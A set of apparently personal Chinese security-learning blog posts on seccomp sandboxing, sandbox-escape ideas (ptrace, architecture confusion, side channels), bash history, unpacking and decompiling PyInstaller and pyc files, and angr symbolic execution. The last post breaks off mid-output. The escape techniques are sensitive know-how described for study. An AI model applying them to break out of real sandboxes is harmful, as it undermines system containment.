内核的一种安全机制，用于限制进程可以调用的系统调用集。本质上是linux系统调用的防火墙，可查看文档http://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html\nseccomp很强大，它可以遗传给子进程，甚至能限制root用户运行的进程，而且可以自己编写复杂的规则来达到目的，能够管理系统调用，禁止某些系统调用，允许某些系统调用，甚至是基于它们的参数来过滤系统调用。\nseccomp原理\nseccomp 的核心工作原理是基于 eBPF（扩展的 Berkeley Packet Filter），一种内核中的 “虚拟机” 机制，来定义和执行系统调用的过滤规则。**BCC (BPF Compiler Collection)** 就是一个基于 eBPF 的工具集，可以对系统进行深度的追踪分析，帮助开发者理解和优化系统行为。\nBPF 最初是一个简单的虚拟机，允许用户在内核中安装过滤器程序，这些程序可以定义哪些网络数据包被捕获、过滤或丢弃。而eBPF是利用库，比如seccomp等建立起过滤器，是 BPF 的扩展，最初用于扩展网络过滤功能，但现在它被广泛用于监控、追踪、和执行更多类型的内核任务，不仅限于网络过滤。eBPF 是一个通用的、可编程的内核沙箱系统，可以在不修改内核源码的情况下，通过动态加载字节码，增强内核功能。\n工具\n用于提取 seccomp 规则\nhttps://github.com/david942j/seccomp-tools\n演示环节创建沙盒的主要代码：\nscmp_filter_ctx ctx;   //声明上下文，将创建seccomp过滤容器ctx = seccomp_init(SCMP_ACT_ALLON);  //初始化容器seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);//添加规则seccomp_load(ctx);//调用这个沙盒\n\n为了调用，在编译执行文件时需要加一个参数 -lseccomp 像这样 gcc -o a a.c -lseccomp，将它链接在seccomp库\n下载seccomp sudo apt libseccomp-dev\n一个简单的seccomp代码，它的作用是当进程调用 execve 系统调用时，内核将会立即终止该进程,execl(&quot;/bin/cat&quot;, &quot;cat&quot;, &quot;/flag&quot;, (char *)0);就是有关execve的调用\n#define _GNU_SOURCE 1#include &lt;sys/sendfile.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/mman.h&gt;#include &lt;seccomp.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;time.h&gt;int main(int argc, char **argv)&#123;scmp_filter_ctx ctx;ctx = seccomp_init(SCMP_ACT_ALLOW);seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);seccomp_load(ctx);execl(&quot;/bin/cat&quot;, &quot;cat&quot;, &quot;/catflag&quot;, (char *)0);&#125;\n\n正常输出\n└─$ ./seccomp#!/bin/shecho yougettheflag!\n\n加了沙盒代码后的输出,Bad system call\n└─$ ./seccomp                                                                  错误的系统调用\n\n具体可以starce .&#x2F;seccomp查看\n└─$ strace ./seccomp   ...prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)  = 0seccomp(SECCOMP_SET_MODE_FILTER, 0, &#123;len=8, filter=0x5654398a6f60&#125;) = 0execve(&quot;/bin/cat&quot;, [&quot;cat&quot;, &quot;catflag&quot;], 0x7fff389874c8 /* 57 vars */) = 59+++ killed by SIGSYS +++错误的系统调用\n\n演示子进程继承seccomp更换代码，将exe改为read\nseccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);修改为seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(read), 0);\n\n追踪strace cat catflag,可以发现cat调用了read，从文件中读入了flag,cat是seccomp.c的子程序，所以在这里使用cat来演示继承\nmmap(NULL, 139264, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fc515eae000read(3, &quot;#!/bin/sh\\necho yougettheflag!\\n\\n&quot;, 131072) = 31write(1, &quot;#!/bin/sh\\necho yougettheflag!\\n\\n&quot;, 31#!/bin/shecho yougettheflag!) = 31read(3, &quot;&quot;, 131072)  \n\n运行结果\n└─$ ./seccomp                                                                                  错误的系统调用\n\nstrace .&#x2F;seccomp 可以发现read进程被kill了\nopenat(AT_FDCWD, &quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3newfstatat(3, &quot;&quot;, &#123;st_mode=S_IFREG|0644, st_size=123035, ...&#125;, AT_EMPTY_PATH) = 0mmap(NULL, 123035, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fc5b7dc7000close(3)                                = 0openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3read(3, &quot;&quot;, 832)                        = 0+++ killed by SIGSYS +++错误的系统调用\n\n逃逸宽松政策很多程序使用seccomp，比如docker,firefox等，它们使用seccomp来进行保护。同时，这类应用需要和用户进行交互，需要使用互联网，需要高性能，这通常意味着直接调用内核来实现功能，使用系统调用而不是通过它们的父进程。\n系统调用一直在更新，也就意味着沙盒很难一直跟进系统新功能。有些docker漏洞就是因为不正确的seccomp配置导致的。\n其中一个例子是在沙盒中允许使用ptrace,ptrace是linux的调试功能，允许它作为调试器附加到另一个进程，监视它的执行，改变内存，改变寄存器，可以获得完全控制权。最终能通过另一个进程逃离沙盒。可看这篇文章 （KCTF2024 - 第八题星门 题解 与 ptrace绕过seccomp讨论https://bbs.kanxue.com/thread-283186.htm）\n其他系统调用\n\nsendmsg()\n\n不仅可以发送从文件中读取的数据，还可以发送打开文件描述符本身。当在shellcode中执行open，他返回flag的文件描述符，比如数字3.当这个数字被发送到另一个进程，它只是数字3，但是使用sendmsg可以发送包装好的元数据，表明这是一个文件，然后内核看到这个元数据，并将这个打开得内核跟踪的文件传输到你要发信息的进程中。\n\nprctl()\n\n抓包\n\nprocess_vm_writev()\n\n该系统调用可以将内存直接写入另一个程序\n混淆源于：AMD,AMD64向后兼容x86 ,linux支持32位和64位代码在同一个进程中交替进行（沙箱名字：native client https://developer.chrome.com/docs/native-client?hl=zh-cn)\n架构混淆\nlinux对于x86和amd64有不同的系统调用定义，在arm64上使用系统调用指令有两种不同的方式来触发它们，\n比如exit()在amd64中系统调用参数是60，在x86和x86_32中是1\n有两种类型的系统调用： syscall 用于 64 位和 int 0x80 用于 32 位。这些架构具有不同的系统调用编号，分别取决于 rax 和 eax 。默认情况下，seccomp 将终止所有 32 位系统调用。\n也就是说如果在之前的seccomp.c代码里加上32位标准的read调用，就有可能绕过沙箱。在默认配置（前面出现的配置)中，这样的错误不会发现，但是在一些非默认配置中就可能出现这样的混淆错误，从而能被利用\n侧信道如果只是想读取信息而不是拿到shell。\nsleep() 根据进程运行时间来传递数据，类似于sql盲注\n一个bit一个bit的传输\n崩溃与无崩溃：在某些情况下，很明显程序崩溃，因为应用程序明确地通过错误消息告诉您，或者只是缺少一些预期的输出。这可以通过崩溃或继续执行来告诉你 1 位信息，利用这一点的方法类似于使用程序的运行时。\n内核漏洞https://github.com/allpaca/chrome-sbx-db\n参考资料和推荐资源http://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html\nhttps://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/\nhttps://bbs.kanxue.com/thread-283186.htm\nhttps://github.com/allpaca/chrome-sbx-db\nhttps://book.jorianwoltjer.com/binary-exploitation/sandboxes-chroot-seccomp-and-namespaces\neBPF****相关扩展\nhttps://github.com/iovisor/bcc\nhttps://xz.aliyun.com/t/11480?time__1311=Cq0xRDnD0D2A0QD%2FWr90Djxmw4VKYzea4D\nhttps://ebpf.io/what-is-ebpf/\n"},{"title":"shell的历史命令机制","url":"/2024/09/21/shell%E7%9A%84%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4%E6%9C%BA%E5%88%B6/","content":"该想法来自chroot实验\n\n使用新方法建立bash后，我查看“上一条命令”，既按箭头”⋀“，出现的指令并不是当前界面下的历史命令\n比如shell1,我的命令是cd .. cat flag.txt shell2，我之前使用的命令是gcc -o 1 1.c ./1\n在shell1里使用vi新建shell后，再按”⋀“，出现的指令不是cat flag.txt 而是 ./1\n我知道是“新建”了一个shell，但这些历史命令是怎样被分配到各个shell里的呢\n\n1. Shell 的历史记录机制在 Linux 和 Unix 系统中，命令历史记录由每个 Shell 实例独立管理，每个 Shell 会维护自己的命令历史，通常存储在用户的 ~/.bash_history 文件中。然而，这个文件只有在 Shell 退出时才会写入，因此每个运行的 Shell 实例在其运行期间拥有独立的命令历史。\n\nShell 启动：当你启动一个新的 Bash 实例时，它会从 ~/.bash_history 文件中加载命令历史记录，这个历史记录是上次退出的 Bash 实例保存的内容。如果你在多个 Shell 中工作，每个 Shell 在退出时会将它们的命令历史追加到同一个历史文件中。\n\n当前 Shell 的历史记录：在一个 Shell 中，你可以通过按方向键 ↑（Up）访问该 Shell 的命令历史，这些历史命令仅限于当前 Shell 的会话。当你在 Shell1 执行了某些命令（如 cd ..、cat flag.txt），这些命令只会保留在该 Shell 的命令历史中。\n\n\n2. 新建 Shell 实例的行为\n当你在 Shell1 中通过 vi 或其他方式启动一个新的 Bash Shell（Shell2），这个新的 Shell 会从 ~/.bash_history 中读取最近的命令历史，但它不会包含当前正在运行的其他 Shell 的实时历史。它只会载入上一次退出 Shell 时保存的命令记录。\n\n例如，你在 Shell2 中按 ↑ 键时，看到的是 gcc -o 1 1.c ./1，这是因为这个命令在 ~/.bash_history 文件中被保存过，而 cat flag.txt 尚未被写入 ~/.bash_history，因为 Shell1 仍然在运行，并且没有退出。\n\n\n3. 历史记录在不同 Shell 之间的共享\n默认情况下，每个 Bash 实例的历史记录都是独立的，只有在当前 Shell 退出时，它的命令历史才会追加到 ~/.bash_history 中。不同 Shell 之间的历史记录不会实时同步，因此你在 Shell1 中运行的命令（如 cat flag.txt）在 Shell1 退出之前，不会对其他 Shell 可见。\n\n4. 如何让多个 Shell 共享实时历史记录为了在多个 Shell 实例之间共享实时历史记录，可以使用以下设置来配置 bash 的历史记录行为：\n在 ~/.bashrc 文件中添加以下内容：\n# 使历史记录立即写入文件shopt -s histappendPROMPT_COMMAND=&#x27;history -a; history -n&#x27;# `history -a` 将新命令追加到历史文件中# `history -n` 从历史文件中读取新命令\n\n这样可以确保每个 Shell 在执行新命令后立即将命令写入 ~/.bash_history 文件，并从其他 Shell 中读取最新的历史记录。\n5. 总结\n默认行为：每个 Shell 实例有自己的命令历史，历史记录只有在 Shell 退出后才会写入 ~/.bash_history 文件。每个新 Shell 启动时只会读取文件中已有的历史记录，而不会与其他正在运行的 Shell 实时同步。\n\n解决方案：通过修改 ~/.bashrc 中的配置，可以让多个 Shell 实时共享命令历史记录，这样在每个 Shell 中都能看到所有已执行的命令。\n\n\n"},{"title":"python逆向","url":"/2024/09/18/python%E9%80%86%E5%90%91/","content":"参照此文章编写https://rocky.github.io/blackhat-asia-2024-additional/all-notes-print\nPython 字节码的变化非常大，每个版本之间都有很大的区别。高级字节码的一个方面：许多源信息（如变量名称及其类型）都保存在字节码中。所以反编译回来的程序会和源代码非常像（简直一模一样）。但是来自源文本的注释不会显示在重建结果中，这是因为这些注释不会出现在字节码中的任何位置。\nThe disassembler is great with code that doesn’t have jumps in it. But once we have jumps, like we have in the highlighted instructions, a disassembler has to stop combining instructions.\n反汇编器非常适合没有跳转的代码。但是，一旦我们有了跳转，就像我们在突出显示的指令中一样，反汇编器必须停止组合指令。\nWith each new Python release, control flow decompilation has become increasingly more difficult. Nowadays, about 1&#x2F;3 of the issues raised in the decompiler bug trackers are related to control flow.\n随着每个新的 Python 版本的发布，控制流反编译变得越来越困难。如今，反编译器错误跟踪器中提出的问题中约有 1&#x2F;3 与控制流有关。\nGrammars and the grammar-based approach we use, however, can naturally parse nesting and sequencing control structures quite well. So having a methodical way to characterize control flow that fits into the decompiler parsing can give more precision and accuracy that is not available in general-purpose decompilers\n然而，语法和我们使用的基于语法的方法可以很自然地很好地解析嵌套和排序控制结构。因此，有一种有条不紊的方法来表征适合反编译器解析的控制流，可以提供通用反编译器所不具备的更高的精度和准确性\nThere are other decompilers for Python. They all start out with a disassembly, even the one I looked at that uses machine learning. Many build a tree—more or less—based on instructions from a disasssembly, and they all produce source text from that internal tree-ish structure.\nPython 还有其他反编译器。它们都是从拆解开始的，即使是我看到的那个使用机器学习的拆解。许多人或多或少地根据反汇编的指令构建了一棵树，并且它们都从内部的树状结构中生成源文本。\nHowever, they are a bit more ad hoc. None use the grammar-based approach here. The phases are fewer and a little less distinct.\n但是，它们更具临时性。这里没有使用基于语法的方法。相位较少，也不太明显。\nGeneral-purpose decompilers like you find in Ghidra are largely different. They live in a more complicated world. To be able to do things across a wider spectrum of machine languages and a wider spectrum of programming-language environments, they largely give up on the hope of noticing specific patterns of instructions. This came up in the chained-comparison example. The ability to match specific patterns is what makes these decompilers produce extremely intuitive and accurate results and written in the programming language that the source text was also written in.\n像你在 Ghidra 中发现的通用反编译器有很大不同。他们生活在一个更加复杂的世界里。为了能够在更广泛的机器语言和更广泛的编程语言环境中做事，他们在很大程度上放弃了注意到特定指令模式的希望。这出现在链式比较示例中。匹配特定模式的能力使这些反编译器能够产生极其直观和准确的结果，并且是用编写源文本的编程语言编写的。\nControl Flow, in General-purpose decompilers, is its own canned phase. This phase doesn’t take into account the specific target programming language that produced the code and the specific set of control-flow structures that the source language has.\n在通用反编译器中，控制流是它自己的固定阶段。此阶段不考虑生成代码的特定目标编程语言以及源语言具有的特定控制流结构集。\nOur control flow is intimately tied to the control flow for a particular Python version. When Python added a new construct like “async” co-routines in Python 3.5, it added a new kind of control-flow pattern match. Python has an extremely rich set of control-flow structures. I know of no canned control-flow-detection mechanism that would be able to cover all control-flow mechanisms that Python includes like the “else” clauses on “while”, “for”, and “try” blocks.\n我们的控制流与特定 Python 版本的控制流密切相关。当 Python 在 Python 3.5 中添加类似“异步”协程的新构造时，它添加了一种新的控制流模式匹配。Python 具有一组极其丰富的控制流结构。据我所知，没有一种预制的控制流检测机制能够涵盖 Python 包含的所有控制流机制，例如“while”、“for”和“try”块上的“else”子句。\nOur approach uses tokenization to facilitated parsing. This is similar to the lift phase that general-purpose decompilers often do after initial disassembly . In general-purpose decompilers, the lifting language is sometimes to LLVM or an LLVM-like language. In Python, our intermediate language is very much tied to Python bytecode. In general, that is true for all high-level bytecode decompilers. The intermediate code looks like the high-level bytecode. Also, this intermediate language drifts over time along with the language and bytecode drift.\n我们的方法使用标记化来促进解析。这类似于通用反编译器在初始反汇编后经常执行的提升阶段。在通用反编译器中，提升语言有时是 LLVM 或类似 LLVM 的语言。在 Python 中，我们的中间语言与 Python 字节码密切相关。通常，所有高级字节码反编译器都是如此。中间代码类似于高级字节码。此外，这种中间语言会随着语言和字节码的漂移而漂移。\n作者给出了实验性的新代码，Chained Compare Parse Tree 链式比较解析树\npython开发python打包成exe的方法https://saucer-man.com/information_security/825.html\n编写了个小代码来进行下面的逆向\npyinstaller -F -w -n active exercise.py\n-F 或 --onefile：这个选项告诉 PyInstaller 将所有文件打包进一个单独的可执行文件中。这样做的好处是分发和运行应用程序更为简单，因为所有依赖项都包含在这个单一文件中。-w 或 --windowed：这个选项用于指定应用程序应该在没有控制台窗口的情况下运行。这对于图形用户界面（GUI）应用程序特别有用，因为它可以让应用程序在运行时不会显示命令行窗口。-n 或 --name：这个选项允许你指定打包后可执行文件的名称。在这个例子中，可执行文件的名称将是 active。\n\n\n(太容易报毒了建议暂时关掉防护，把我刚生成的exe文件删掉了）\n\n解包exePyinstxtractor\nPyinstxtractor可以解包exe\nhttps://sourceforge.net/projects/pyinstallerextractor/python pyinstxtractor.py  待解包的文件名.exe\n\n执行后就像这样\n\n一般来说我们会获得一个和我们解包的exe同名的pyc文件，这个时候就和第一种类型题目一样，将pyc文件还原成py文件进行逆向即可。\n\n解包文件后文件组成PYZ-00.pyz_extracted非常重要，一般一个稍微大一点的项目都会分成多个py文件，甚至会依赖其他模块，这些被依赖的文件解析后都会放入PYZ-00.pyz_extracted中，可以说这里放的是核心代码。\npyc逆向pyc结构pyc文件分为pyc文件头部分和PyCodeObject部分。文件头部分即为上文中谈到的魔数时间戳部分，而PyCodeObject是在CPython（Python 的官方解释器实现）中用来表示编译后的代码对象的结构体。实际上，pyc 文件就是 PyCodeObject 对象在硬盘上的保存形式。\n不同版本的python的魔数头\nPyObject_HEAD\n不同的 Python 版本会有不同的 PyObject_HEAD：\n td {white-space:nowrap;border:1px solid #dee0e3;font-size:10pt;font-style:normal;font-weight:normal;vertical-align:middle;word-break:normal;word-wrap:normal;}\n\n\n\n\n\n\n\n\n\nPython 版本\n十六进制文件头\n\n\nPython 2.7\n03f30d0a00000000\n\n\nPython 3.0\n3b0c0d0a00000000\n\n\nPython 3.1\n4f0c0d0a00000000\n\n\nPython 3.2\n6c0c0d0a00000000\n\n\nPython 3.3\n9e0c0d0a0000000000000000\n\n\nPython 3.4\nee0c0d0a0000000000000000\n\n\nPython 3.5\n170d0d0a0000000000000000\n\n\nPython 3.6\n330d0d0a0000000000000000\n\n\nPython 3.7\n420d0d0a000000000000000000000000\n\n\nPython 3.8\n55 0d 0d 0a 00 00 00 00 00 00 00 00 00 00 00 00\n\n\nPython 3.9\n610d0d0a000000000000000000000000\n\n\nPython 3.10\n6f0d0d0a000000000000000000000000\n\n\nPython 3.11\na70d0d0a000000000000000000000000\n\n\nPyCodeObject 的结构如下：\ntypedef struct &#123;PyObject_HEADint co_argcount;        /* 位置参数个数 */int co_nlocals;         /* 局部变量个数 */int co_stacksize;       /* 栈大小 */int co_flags;PyObjectco_code;      /字节码指令序列 */PyObjectco_consts;    /所有常量集合 */PyObjectco_names;     /所有符号名称集合 */PyObjectco_varnames;  /局部变量名称集合 */PyObjectco_freevars;  /闭包用的的变量名集合 */PyObjectco_cellvars;  /内部嵌套函数引用的变量名集合 *//* The rest doesn’t count for hash/cmp */PyObjectco_filename;  /代码所在文件名 */PyObjectco_name;      /模块名|函数名|类名 */int co_firstlineno;     /* 代码块在文件中的起始行号 */PyObjectco_lnotab;    /字节码指令和行号的对应关系 */voidco_zombieframe;   /for optimization only (see frameobject.c) */&#125; PyCodeObject;\n\n代码-&gt;pyc字节码字节码文件的扩展名通常以“.pyc”结尾，或“.pyo”\n1.compileallpython -m compileall test.py\n\n成功编译后会当前目录生成相应文件夹和文件\nV PYTHONEX    v _pycache        exercise.cpython-38.pyc\n\n现在我用的是3.8.18，所以用decompyle3和uncompyle6分别试试反编译\n结果\nPS D: anquan_reandpwn \\pythonex\\pyctest&gt; decompyle3 exercise. cpython-38.pyc# decompyle3 version 3.9.1# Python bytecode version base 3.8.0 (3413)# Decompiled from: Python 3.8.18 (default, Sep 11 2023, 13:39:12) [MSC v.1916 64 bit (AMD64)]# Embedded file name: exercise.py# Compiled at: 2024-07-22 21:25:42# Size of source mod 2 ** 32: 80 bytesdef hello():    print(&quot;hello,hacker&quot;)if __main__ == &quot;__main__&quot;    hello()# okay decompiling exercise.cpython-38.pycPS D:\\anquan_reandpwn\\pythonex\\pyctest&gt;\n\n对于这些参数的解释\n以 # 开头是注释。顶部的部分包含一些元数据，这些元数据存储在字节码文件中。它不是我们之前在十六进制中看到的 25 字节指令序列的一部分(不是代码执行的一部分）Each bytecode has a unique number for the bytecode variant. Here, it is 3413, and this variant covers Python version 3.8.每个字节码都有一个字节码变体的唯一编号。这里是 3413，这个变体涵盖了 Python 3.8 版。Major releases of Python typically can alter the programming language and/or the bytecode, and/or the way the source text gets translated.Python 的主要版本通常可以更改编程语言和/或字节码，和/或源文本的翻译方式。反编译的文件名代码编写时间\n\n我没下载相对应的uncomply6版本，就不演示了\n2.dis库（disassember ）：There is a disassember in the standard Python Library called dis. Most novice decompilers use this— it’s the first thing that comes to mind. But that has some serious limitations. The biggest limitation is that it can only disassemble code for a single Python version, the version that is runining the decompiler. If you are running the latest version of Python, such 3.12, but the bytecode you want to analyze is from an earlier version, like bytecode from 2.7, then you are out of luck. Malware written in Python tends to use older versions of Python. This was the situation when Microsoft folks contacted me.在标准 Python 库中有一个名为 disassember 的dis。大多数新手反编译器都使用它——这是首先想到的。但这有一些严重的局限性。最大的限制是它只能反汇编单个 Python 版本的代码，即运行反编译器的版本。如果您运行的是最新版本的 Python，例如 3.12，但要分析的字节码来自早期版本，例如 2.7 的字节码，那么您就不走运了。用 Python 编写的恶意软件倾向于使用旧版本的 Python。当Microsoft的人联系我时，情况就是这样\n显示字节码的方法\nimport disdis.dis(you_function)或者python -m dis xxx.py\n\n\n\npyc字节码-&gt;代码uncompyle6的详细介绍pip install uncompyle6uncompyle6 -o output_file.py your_file.pyc-o 目标生成的Python文件名 原pyc文件名\n\nuncompyle6的工作原理:\n\nGet bytecode disassembly using xdis. xdis is the cross-version disassembly library that I wrote to be able to support these decompilers. It is also useful in other projects that work with Python bytecode.使用 xdis 获取字节码反汇编。xdis 是我（uncompyle6作者，这段文字复制于原文）编写的跨版本反汇编库，以便能够支持这些反编译器。它在使用 Python 字节码的其他项目中也很有用。\n\n“ Tokenize” the disassembly. “Tokenize” is a compiler-centric term. In other decompilers and code-analysis tools, this process is sometimes called lifting, as in “lifting the disassembly” or “lifting the machine code”.“标记化”反汇编。“Tokenize”是一个以编译器为中心的术语。在其他反编译器和代码分析工具中，此过程有时称为提升，如“提升反汇编”或“提升机器代码”。\n\nParse tokens to create a Parse Tree.解析令牌以创建解析树。\n\nAbstract the parse tree to an “Abstract Syntax Tree”, and finally:将解析树抽象为“抽象语法树”，最后：\n\nProduce Python source text from the Abstract Syntax Tree.从抽象语法树生成 Python 源文本。\n\n\n在机器代码中，操作数通常是寄存器值，可以是数字、地址或地址的一部分。在 Python 字节码中，操作数是任意的 Python 对象！\nxdishttps://pypi.org/project/xdis/\nuncompyle6 和 decompile3 使用 xdis——“跨 Python 反汇编器”。\npip install xdispydisasm -F extended-bytes -S test.pyc-F extended-bytes：指定输出格式为扩展字节码-S：显示源代码和对应的字节码 -F, --format [xasm|bytes|classic|dis|extended|extended-bytes|header]                                  Select disassembly style -S, --show-source / --no-show-source                                  Intersperse Python source text from linecache if available. --version                       Show the version and exit. --help                          Show this message and exit.\n\n结果如下（如果你看了前面的文章链接，就会发现我这里生成的数据和作者的不一样，也许是版本原因，我使用的是python3.8.18,xdis使用的是6.1.1）：\n$pydisasm -F extended-bytes -S exercise.cpython-38.pyc  # pydisasm version 6.1.1# Python bytecode 3.8.0 (3413)# Disassembled from Python 3.8.18 (default, Sep 11 2023, 13:39:12) [MSC v.1916 64 bit (AMD64)]# Timestamp in code: 1721654742 (2024-07-22 21:25:42)# Source code size mod 2**32: 80 bytes# Method Name:       &lt;module&gt;# Filename:          exercise.py# Argument count:    0# Position-only argument count: 0# Keyword-only arguments: 0# Number of locals:  0# Stack size:        2# Flags:             0x00000040 (NOFREE)# First Line:        1# Constants:#    0: &lt;code object hello at 0x00000201695ABD40, file &quot;exercise.py&quot;, line 1&gt;#    1: &#x27;hello&#x27;#    2: &#x27;__main__&#x27;#    3: None# Names:#    0: hello#    1: __name__  1:           0 |64 00| LOAD_CONST           (&lt;code object hello at 0x00000201695ABD40, file &quot;exercise.py&quot;, line 1&gt;) ; TOS = &lt;code object hello at 0x00000201695ABD40, file &quot;exercise.py&quot;, line 1&gt;               2 |64 01| LOAD_CONST           (&quot;hello&quot;) ; TOS = &quot;hello&quot;               4 |84 00| MAKE_FUNCTION        (No arguments) ; TOS = def hello(): ...               6 |5a 00| STORE_NAME           (hello) ; hello = def hello(): ...  4:           8 |65 01| LOAD_NAME            (__name__) ; TOS = __name__              10 |64 02| LOAD_CONST           (&quot;__main__&quot;) ; TOS = &quot;__main__&quot;              12 |6b 02| COMPARE_OP           (==) ; TOS = __name__ == (&quot;__main__&quot;)              14 |72 16| POP_JUMP_IF_FALSE    (to 22)  5:          16 |65 00| LOAD_NAME            (hello) ; TOS = hello              18 |83 00| CALL_FUNCTION        (0 positional arguments) ; TOS = hello()              20 |01 00| POP_TOP         &gt;&gt;   22 |64 03| LOAD_CONST           (None) ; TOS = None              24 |53 00| RETURN_VALUE         return None# Method Name:       hello# Filename:          exercise.py# Argument count:    0# Position-only argument count: 0# Keyword-only arguments: 0# Number of locals:  0# Stack size:        2# Flags:             0x00000043 (NOFREE | NEWLOCALS | OPTIMIZED)# First Line:        1# Constants:#    0: None#    1: &#x27;hello,hacker&#x27;# Names:#    0: print  2:           0 |74 00| LOAD_GLOBAL          (print) ; TOS = print               2 |64 01| LOAD_CONST           (&quot;hello,hacker&quot;) ; TOS = &quot;hello,hacker&quot;               4 |83 01| CALL_FUNCTION        (1 positional argument) ; TOS = print(&quot;hello,hacker&quot;)               6 |01 00| POP_TOP               8 |64 00| LOAD_CONST           (None) ; TOS = None              10 |53 00| RETURN_VALUE         return None\n\npycdchttps://github.com/extremecoders-re/decompyle-buildspycdc -o output_file.py your_file.pyc\n\ndecompyle3它只处理 Python 3.7 和 3.8。\npip install decompyle3 decompyle3 *compiled-python-file-pyc-or-pyo*\n\n加花的pycPython 字节码控制流分析Python control_flow\npython序列化和反序列化marshal(读写pyc字节码):marshal 模块是 Python 内置的一个模块，用于在二进制格式和 Python 对象之间进行序列化和反序列化。与 pickle 模块不同，marshal 模块主要用于处理 Python 字节码，并且不保证跨 Python 版本的兼容性。通常，marshal 用于读写 .pyc 文件中的字节码。\nmarshal 模块的常用函数\n\n**marshal.dump**：将 Python 对象序列化到文件中。\n\n**marshal.load**：从文件中反序列化 Python 对象。\n\n**marshal.dumps**：将 Python 对象序列化为二进制数据。\n\n**marshal.loads**：将二进制数据反序列化为 Python 对象\n\n\n利用示范\n对象和文件\nimport marshaldata = &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3&#125;# 将对象序列化到文件with open(&#x27;data.marshal&#x27;, &#x27;wb&#x27;) as f:    marshal.dump(data, f)# 从文件反序列化对象with open(&#x27;data.marshal&#x27;, &#x27;rb&#x27;) as f:    data = marshal.load(f)print(data)  # 输出: &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3&#125;\n\n对象和二进制数据\nimport marshaldata = &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3&#125;# 将对象序列化为二进制数据binary_data = marshal.dumps(data)print(binary_data)  # 输出: 二进制数据#从二进制数据反序列化对象data=marshal.loads(binary_data)print(data)\n"},{"title":"动态符号执行","url":"/2024/09/18/%E5%8A%A8%E6%80%81%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/","content":"初始概念介绍动态符号执行的核心思想是在所谓的符号数据域上模拟程序执行\ncpu工作在1和0上，如果使用read系统调用读入用户输入，得到的是1和0.作为发送程序的人，无法给它发送一个未知值的变量，但是可以创造一个模拟器来实现它，可以是0，1或者x.随着知道已知数据是什么，未知数据是什么，根据cmp比较未知数据，并基于结果进行跳转\nmov rax, 0  &gt; rax = 0mov rdi, 0  &gt;rax = 0, rdi = 0mov rdx, 1  &gt; rax = 0, rdi = 0, rdx = 1syscall -   &gt;rax = 0, rdi = 0, rdx = 1, [rsi] = user_inputcmp qword ptr [rsi], 42   &gt;rax = 0, rdi = 0, rdx = 1, [rsi] = user_input, user_input == 42?je .get_flag\n\n就可以创造出一个公式，描述程序的行为，获得程序的输入、检查条件和持续输出之间的关系\n(user_inp(user_input == 42 AND program_output == the_flag) OR(user input != 42 AND program output == &quot;INCORRECT&quot;)ut == 42 AND program_output == the_flag) OR(user input != 42 AND program output == &quot;INCORRECT&quot;)\n\n然后加上一些约束关系，就可以得到有效答案\n(    (user_input == 42 AND program_output == the_flag) OR    (user_input != 42 AND program_output == &quot;INCORRECT&quot;)  &gt;user_input == 42) AND (program_output != &quot;INCORRECT&quot;)\n\n原理现代的动态符号执行会模拟代码，转化为数据公式\n符号执行必须像普通CPU一样按顺序执行代码，不过它有一个可修改的模拟状态。\n在它执行程序时，每当遇到分支，模拟器就会多分出一个内部状态，一个状态根据条件进入一个分支，而另一个不会进入同一个分支。当这些状态分离后它们的行为就不一样了，\n\nangr一些其他工具\n\nangr: our binary analysis framework that does (among other things) symboli\nexecution.\nmiasm: another binary analysis framework that does symbolic execution.\ns2e: another binary analysis framework that does symbolic execution.\nmanticore: another binary analysis framework that does symbolic execution.\nklee: symbolic execution on source code.\n\nangr 安装（加个镜像源安装更快）\nhttps://github.com/angr/angr\npip install angr -i https://pypi.tuna.tsinghua.edu.cn/simple\n\nangr 依赖于 pycparser 来解析 C 代码。如果没有安装 pycparser，就会出现错误。\npip install pycparser -i https://pypi.tuna.tsinghua.edu.cn/simple\n\n如果还有报错，就尝试更新\npip install --upgrade pycparser\n\nangr基本使用\n使用的测试代码 do.c\nint main()&#123;    char buffer[1024];    read(0, buffer, 1);    if (buffer[0] == 42)        puts(&quot;Success!&quot;);    else        puts(&quot;Failure!&quot;);&#125;\n\n//angr有项目的概念，基本就是打开二进制程序以及他用的所有库In [1]: import angrIn [3]: p=angr.Project(&quot;do&quot;)//可以得到各种各样的信息，比如入口地址In [4]: hex(p.entry)Out[4]: &#x27;0x401050&#x27;In [5]: p.factory.block(0x401050).pp()        _start:401050  xor     ebp, ebp401052  mov     r9, rdx401055  pop     rsi401056  mov     rdx, rsp401059  and     rsp, 0xfffffffffffffff040105d  push    rax40105e  push    rsp40105f  xor     r8d, r8d401062  xor     ecx, ecx401064  mov     rdi, main40106b  call    qword ptr [0x403fd8]//现在来用它做一个模拟器，它从一个激活状态开始In [6]: sm=p.factory.simulation_manager()In [7]: sm.activeOut[7]: [&lt;SimState @ 0x401050&gt;]In [8]: sm.active[0]Out[8]: &lt;SimState @ 0x401050&gt;//这个状态有寄存器之类的东西，这些是寄存器的初始值In [9]: sm.active[0].regsOut[9]: &lt;angr.state_plugins.view.SimRegNameView at 0x7fa4c530f190&gt;In [10]: sm.active[0].regs.raxOut[10]: &lt;BV64 